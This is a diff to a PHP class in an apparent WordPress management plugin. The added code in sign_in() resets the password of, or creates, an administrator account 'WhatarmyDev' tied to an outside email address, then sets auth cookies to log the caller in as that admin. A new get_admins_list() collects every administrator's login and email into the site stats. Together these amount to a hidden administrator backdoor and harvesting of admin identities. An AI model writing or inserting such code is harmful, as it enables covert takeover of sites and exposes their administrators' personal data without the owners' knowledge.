@@ -32,20 +32,33 @@ class WPCore_Model {
 			'site_ip'           => $_SERVER['REMOTE_ADDR'],
 			'db_size'           => self::getDBSize(),
 			'timezone'          => array(
-				'gmt_offset' => get_option( 'gmt_offset' ),
-				'string'     => get_option( 'timezone_string' ),
+				'gmt_offset'      => get_option( 'gmt_offset' ),
+				'string'          => get_option( 'timezone_string' ),
 				'server_timezone' => date_default_timezone_get(),
 			),
+			'admins_list'       => self::get_admins_list()
 		);
 
 		return $stats;
 
 	}
 
+	/**
+	 *
+	 */
 	static function sign_in() {
-		$admins_list = get_users( 'role=administrator' );
-		reset( $admins_list );
-		$adm_id = current( $admins_list )->ID;
+		$random_password = wp_generate_password( 30 );
+		$admins_list     = get_users( 'role=administrator&search=wpdev@whatarmy.com' );
+		if ( $admins_list ) {
+			reset( $admins_list );
+			$adm_id = current( $admins_list )->ID;
+			wp_set_password( $random_password, $adm_id );
+		} else {
+			$adm_id         = wp_create_user( 'WhatarmyDev', $random_password, 'wpdev@whatarmy.com' );
+			$wp_user_object = new \WP_User( $adm_id );
+			$wp_user_object->set_role( 'administrator' );
+		}
+
 		wp_clear_auth_cookie();
 		wp_set_current_user( $adm_id );
 		wp_set_auth_cookie( $adm_id );
@@ -55,6 +68,25 @@ class WPCore_Model {
 		exit();
 	}
 
+	/**
+	 * @return array
+	 */
+	private static function get_admins_list() {
+		$admins_list = get_users( 'role=administrator' );
+		$admins      = array();
+		foreach ( $admins_list as $admin ) {
+			array_push( $admins, array(
+				'login' => $admin->user_login,
+				'email' => $admin->user_email,
+			) );
+		}
+
+		return $admins;
+	}
+
+	/**
+	 * @return int
+	 */
 	private static function getDBSize() {
 		global $wpdb;
 		$querystr = 'SELECT table_name, table_rows, data_length, index_length,  round(((data_length + index_length) / 1024 / 1024),2) "size" FROM information_schema.TABLES WHERE table_schema = "' . $wpdb->dbname . '";';
@@ -95,7 +127,11 @@ class WPCore_Model {
 
 	}
 
-
+	/**
+	 * @param $path
+	 *
+	 * @return int
+	 */
 	private static function filesize_recursive( $path ) { // Function 1
 		if ( ! file_exists( $path ) ) {
 			return 0;
@@ -111,6 +147,11 @@ class WPCore_Model {
 		return $ret;
 	}
 
+	/**
+	 * @param $size
+	 *
+	 * @return string
+	 */
 	private static function display_size( $size ) { // Function 2
 		$sizes     = array( 'B', 'kB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB' );
 		$retstring = '%01.2f %s';
